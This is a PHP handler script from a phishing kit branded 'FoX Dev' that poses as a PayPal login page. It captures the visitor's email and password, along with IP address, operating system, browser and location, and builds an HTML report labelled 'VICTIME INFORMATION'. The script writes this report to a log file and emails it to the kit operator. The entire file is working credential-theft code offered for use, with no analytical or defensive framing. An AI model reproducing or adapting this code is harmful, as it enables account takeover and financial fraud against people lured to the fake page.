<?php

session_start();

include("detect.php");
include("system.php");

	
$email    = $_SESSION['_email_']        = $_POST['login_email'];
$PASS      = $_SESSION['_password1_']     = $_POST['login_password'];

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	



include("sand_email.php");






$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");






$marshall_email .= "<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;border-style: solid;border-color: coral;width: 415px;background: url();background-repeat: no-repeat;background-position: center;'>
●•۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰•●<br/>
±±±±±±±±±±[ <font style='color: #FF358B;'>LOGIN INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🚩</font> COUNTRY = </font> <font style='color:#010101;'>".$_SESSION."</font><br>
<font style='color:#9c0000;'>🕘</font> DATE Rezult = <font style='color:#0070ba;'>".$InfoDATE."</font><br>
<font style='color:#9c0000;'>💌</font> Email = <font style='color:#0070ba;'>".$_SESSION['_email_']."</font><br>
<font style='color:#9c0000;'>🔐</font> Password = <font style='color:#0070ba;'>".$_SESSION['_password1_']."</font><br>
±±±±±±±±±±[ <font style='color: #FF358B;'>IP INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>💒</font> City = <font style='color:#0070ba;'>".$_SESSION['geoplugin_city']."</font><br>
<font style='color:#9c0000;'>⛪</font>  State	= <font style='color:#0070ba;'>".$_SESSION['country1']."</font><br>
<font style='color:#9c0000;'>📫</font> Zip Code = <font style='color:#0070ba;'>".$_SESSION['countrycode1']."</font><br>
±±±±±±±±±±[ <font style='color: #FF358B;'>VICTIME INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🗺</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>💻</font> SYS = <font style='color:#0070ba;'>".$OS."</font><br>
<font style='color:#9c0000;'>🌀</font> BROWSER = <font style='color:#0070ba;'>".$browserTy_Version."</font><br>
<font style='color:#9c0000;'>🍁</font> ADRESS IP = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
●•۰۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰۰۰•●<br/>
</div></html>";

include("sand_email.php");

$f = fopen("../../FoxDev.html", "a");
fwrite($f, $marshall_email);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " Login PayPal [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: ◙[•♥•FoX Dev •♥•]◙ <dev@fox.com>" . "\r\n";

mail($yourmail, $subject, $marshall_email , $headers);


?>

